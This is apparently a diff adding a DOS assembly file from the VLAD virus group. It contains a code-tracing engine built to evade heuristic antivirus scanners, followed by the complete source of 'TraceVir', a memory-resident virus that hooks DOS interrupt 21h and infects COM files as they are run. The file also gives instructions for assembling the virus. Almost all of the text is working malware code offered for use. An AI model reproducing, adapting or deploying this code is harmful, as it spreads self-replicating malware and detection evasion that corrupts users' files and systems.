@@ -1,0 +1,572 @@
+
+;
+;       The VLAD Surface Tracing Engine - VSTE
+;                    by
+;                Qark [VLAD]
+;
+;
+; This engine works by calculating the length of the instructions, and
+; continuously going through code, until it comes to a conditional
+; jump, or an opcode it doesn't know.  Even though the engine doesn't
+; normally tunnel far, because conditional jumps are so common, it is 
+; extremely effective against heuristical scanners, always giving zero
+; flags.
+;
+; Following the code for VSTE, is the source for a simple example virus.
+; Cut and paste it to a separate file and rename this file to trace.asm
+; Assemble the example virus using A86.
+;
+; On Entry:
+;
+; DS:SI = Offset of buffer to trace through.
+; CS = DS = ES
+; BX = Filehandle
+; Buffer has to be at least 300 bytes long, and the filepointer should
+; be as it was, if the buffer was just read.
+;
+; On Exit:
+;
+; DX:AX = The file pointer of the place to insert the jump.
+; DS:SI = Buffer, whose first byte is the data that needs to be replaced
+;         by a jump.
+;
+
+VSTE:
+        mov     word ptr orig_si,si
+        mov     word ptr last_inst,si
+
+Recurse:
+        mov     ax,word ptr orig_si
+        cmp     si,ax
+        jb      lseek_back
+        add     ax,290
+        cmp     si,ax
+        jb      in_buffer
+
+lseek_back:
+        call    read_opcode
+        jmp     recurse
+
+Read_Opcode:
+        ;Get current file pointer.
+        mov     ax,4201h
+        xor     cx,cx
+        cwd
+        int     21h
+
+        mov     cx,dx
+        mov     dx,ax
+        
+        mov     ax,word ptr orig_si
+        add     ax,300
+        sub     si,ax
+        jnc     forward_seek
+        neg     si
+        sub     dx,si
+        sbb     cx,0
+        jmp     short do_seek
+forward_seek:
+        add     dx,si
+        adc     cx,0
+do_seek:
+        mov     ax,4200h
+        int     21h
+
+        mov     ah,3fh
+        mov     cx,300
+        mov     dx,word ptr orig_si
+        int     21h
+        
+        mov     si,word ptr orig_si
+
+        ret
+
+in_buffer:
+        ;Start checking opcode lengths and acting upon them.
+        mov     al,byte ptr [si]
+        cmp     al,0e9h
+        je      do_jump
+        cmp     al,0e8h
+        je      do_jump
+        cmp     al,0ebh
+        je      do_jumpsh
+        
+        cmp     al,9ah          ;callf
+        je      abort
+        jmp     check_opcodes
+do_jump:
+        mov     ax,word ptr [si+1]
+        add     ax,3
+        add     si,ax
+        jmp     recurse
+do_jumpsh:
+        mov     al,byte ptr [si+1]
+        add     al,2
+        cbw
+        add     si,ax
+        jmp     recurse
+        
+check_opcodes:
+        ;x6 x7 xe xf where 0x-5x = 1 byte               =
+        ;4x 5x = 1 byte                                 =
+        ;9x = 1byte except 9ah                          =
+        ;7x = abort                                     =
+        ;cd = 2                                         =
+        ;cx where > x7 = abort                          =
+        ;6x = abort                                     =
+        ;dx where > x3 = abort                          =
+        ;ex = abort, except in the case of jumps        =
+        ;fx = 1 byte, except in x6 x7 xe xf             =
+        ;bx where > x7 = 3 bytes, else 2 bytes          =
+        ;ax where > x9 = 1 byte, x4-x7 = 1 byte         =
+        ;for 0x - 3x, xc 4x = 2 bytes,  xd 5x = 3 bytes
+        ;x0 - x3 and x8-xb, 0x - 3x handle r/m
+
+
+
+        mov     ah,al
+        and     ah,0f0h
+        and     al,0fh
+        
+        ;ah=0x al=x0
+
+        cmp     ah,40h
+        je      one_byte         ;dec/inc
+        cmp     ah,50h
+        je      one_byte         ;push/pop
+        cmp     ah,60h          ;286+
+        je      abort
+        cmp     ah,70h          ;cond jumps
+        je      abort
+        cmp     ah,0c0h
+        je      check_int
+        cmp     ah,0e0h         ;misc jumps
+        je      abort
+        cmp     ah,90h          ;nop etc xchg
+        je      one_byte
+        cmp     ah,0f0h
+        je      handle_fx
+        cmp     ah,0b0h
+        je      handle_bx
+        cmp     ah,0a0h
+        je      handle_ax
+        cmp     ah,0d0h
+        je      handle_dx
+        cmp     ah,80h
+        je      handle_8x
+
+        cmp     ah,40h
+        jb      handle0_3x
+        
+        jmp     abort
+
+abort:
+        call    read_opcode
+        mov     ax,4201h
+        xor     cx,cx
+        cwd
+        int     21h
+        sub     ax,300
+        sbb     dx,0
+        mov     cx,dx
+        mov     dx,ax
+        mov     ax,4200h
+        int     21h
+
+        ret
+
+;----------
+;cx comes here
+check_int:
+        cmp     al,0dh
+        je      two_byte
+        cmp     al,7
+        ja      abort
+        cmp     al,4
+        jb      abort
+        jmp     handle_rm
+
+;----------
+three_byte:
+;Move three bytes forward
+        inc     si
+two_byte:
+;Move two bytes forward
+        inc     si
+
+;Move one byte forward
+one_byte:
+        inc     si
+        jmp     recurse
+
+;----------
+handle_bx:
+        cmp     al,7
+        ja      three_byte
+        jmp     two_byte
+
+;----------
+handle_fx:
+        and     al,6
+        cmp     al,6
+        jne     one_byte
+        ;I think ?
+        jmp     handle_rm
+
+;----------
+handle_ax:
+        cmp     al,5
+        jb      do_ax_long
+        cmp     al,8
+        je      do_ax_long
+        cmp     al,9
+        je      do_ax_long
+        jmp     one_byte
+do_ax_long:
+        jmp     three_byte
+do_ax_short:
+        jmp     two_byte
+
+;----------
+handle0_3x:
+        cmp     al,4
+        je      two_byte
+        cmp     al,5
+        je      three_byte
+        cmp     al,6
+        je      one_byte
+        cmp     al,7
+        je      one_byte
+        cmp     al,0ch
+        je      two_byte
+        cmp     al,0dh
+        je      three_byte
+        cmp     al,0eh
+        jae     one_byte
+        jmp     handle_rm
+;----------
+handle_dx:
+        cmp     al,3
+        ja      abort
+;----------
+handle_8x:
+        jmp     handle_rm
+
+;----------
+handle_rm:
+;handles r/m instructions
+
+        ;handle the 'arop' instructions differently
+        mov     word ptr immediate,0
+        mov     al,byte ptr [si]
+        cmp     al,0c6h
+        je      immed_mov
+        cmp     al,0c7h
+        je      immed_mov
+        cmp     al,80h
+        jb      not_arop
+        cmp     al,83h
+        ja      not_arop
+immed_mov:
+        mov     word ptr immediate,1
+        test    al,1
+        jz      not_arop        ;must be byte ptr
+        cmp     al,83h
+        ja      word_c7
+        test    al,2
+        jnz     not_arop
+word_c7:
+        mov     word ptr immediate,2
+        
+not_arop:
+        ;
+
+        inc     si
+        mov     al,byte ptr [si]
+        and     al,0c0h
+
+        cmp     al,0c0h
+        je      zerobytedisp
+        cmp     al,0
+        je      checkdisp
+        cmp     al,80h
+        je      twobytedisp
+        
+        add     si,word ptr immediate
+        jmp     two_byte
+
+checkdisp:
+        mov     al,byte ptr [si]
+        and     al,7
+        cmp     al,6
+        je      twobytedisp
+zerobytedisp:
+        add     si,word ptr immediate
+        jmp     one_byte
+twobytedisp:
+        add     si,word ptr immediate
+        jmp     three_byte
+;----------
+
+immediate       dw      0
+
+orig_si         dw      0       ;The starting address of the buffer
+last_inst       dw      0       ;The address of the last instruction calculated
+
+
+==================== cut here =============================================
+
+
+;
+;       VSTE test virus.
+;
+; Tests the surface tracing abilities of the VSTE engine. Seems to work ok
+; so far, although programming to fit the engine seems a bit messy.
+; This virus is a lame TSR COM infector.
+;
+
+        org     0
+
+        pushf
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+        push    si
+        push    di
+        push    ds
+        push    es
+        push    bp
+
+        cld
+
+        call    next
+next:
+        pop     si
+        sub     si,offset next
+
+        mov     ax,4b78h
+        int     21h
+
+        cmp     ax,784bh
+        je      exit_virus
+
+        mov     ax,ds
+        dec     ax
+        mov     ds,ax
+
+        cmp     byte ptr [0],'Z'
+        jne     exit_virus
+
+        sub     word ptr [12h],((offset v_mem/10h)+1)
+        sub     word ptr [3],((offset v_mem/10h)+1)
+
+        mov     ax,word ptr [12h]
+
+        mov     es,ax
+        push    cs
+        pop     ds
+
+        xor     di,di
+        mov     cx,offset virus_size
+        push    si
+        rep     movsb
+
+        ;Set int 21.
+        mov     ds,cx
+        mov     si,21h*4
+        mov     di,offset i21
+        movsw
+        movsw
+
+        mov     word ptr [si-4],offset int21handler
+        mov     word ptr [si-2],es
+
+        push    cs
+        pop     es
+
+        pop     si
+
+exit_virus:
+        mov     di,100h
+        org     $-2
+ret_off dw      100h
+
+        mov     ax,20cdh
+        org     $-2
+f2      dw      20cdh
+
+        stosw
+
+        mov     al,90h
+        org     $-1
+f1      db      90h
+
+        stosb
+        sub     di,3
+        
+        sub     di,si
+        sub     di,offset jump -1
+
+        sub     di,3
+
+        mov     word ptr cs:[si+offset jump],di
+
+        pop     bp
+        pop     es
+        pop     ds
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+        popf
+        jmp short $+2
+        db      0e9h
+
+        jump    dw      0
+
+        db      'TraceVir by Qark/VLAD',0
+        db      'This virus tests the VSTE engine',0
+
+res_test:
+        xchg    ah,al
+        iret
+
+int21handler:
+        cmp     ax,4b78h
+        je      res_test
+        cmp     ah,4bh
+        je      infect
+
+int21exit:
+        db      0eah
+        i21     dd      0
+Infect:
+        pushf
+        push    ax
+        push    bx
+        push    cx
+        push    dx
+        push    si
+        push    di
+        push    ds
+        push    es
+        push    bp
+
+        mov     ax,3d02h
+        call    int21h
+        jnc     open_ok
+oinfex:
+        jmp     infect_exit
+open_ok:
+        mov     bx,ax
+
+        push    cs
+        pop     ds
+        push    cs
+        pop     es
+
+        mov     dx,offset buffer
+        mov     cx,300
+        mov     ah,3fh
+        call    int21h
+
+        cmp     word ptr buffer,'ZM'
+        je      oinfex
+
+        mov     ax,5700h
+        call    int21h
+        mov     word ptr time,cx
+        mov     word ptr date,dx
+
+        and     cl,1fh
+        cmp     cl,2
+        je      oinfex
+
+        mov     ax,4202h
+        xor     cx,cx
+        cwd
+        call    int21h
+
+        mov     word ptr fsize,ax
+
+        mov     ax,4200h
+        xor     cx,cx
+        mov     dx,300
+        call    int21h
+        
+        mov     si,offset buffer
+        call    vste
+
+        push    ax
+        add     ax,100h
+        mov     word ptr ret_off,ax
+
+        mov     ax,word ptr buffer
+        mov     word ptr f2,ax
+        mov     al,byte ptr buffer+2
+        mov     byte ptr f1,al        
+
+        mov     byte ptr buffer,0e9h
+        pop     ax
+
+        add     ax,3
+        mov     cx,word ptr fsize
+        sub     cx,ax
+
+        mov     word ptr buffer+1,cx
+
+        mov     ah,40h
+        mov     cx,300
+        mov     dx,offset buffer
+        call    int21h
+
+        mov     ax,4202h
+        xor     cx,cx
+        cwd
+        call    int21h
+
+        mov     ah,40h
+        mov     cx,offset virus_size
+        xor     dx,dx
+        call    int21h
+
+        mov     ax,5701h
+        mov     cx,word ptr time
+        and     cl,0e0h
+        or      cl,2
+        mov     dx,word ptr date
+        call    int21h
+
+        mov     ah,3eh
+        call    int21h
+        
+infect_exit:
+        pop     bp
+        pop     es
+        pop     ds
+        pop     di
+        pop     si
+        pop     dx
+        pop     cx
+        pop     bx
+        pop     ax
+        popf
+        jmp     int21exit
+
+int21h:
+        pushf
+        call    dword ptr cs:i21
+        ret
+
+        include trace.asm
+
+fsize   dw      0
+date    dw      0
+time    dw      0
+
+virus_size:
+buffer  db      300 dup (0)
+v_mem:
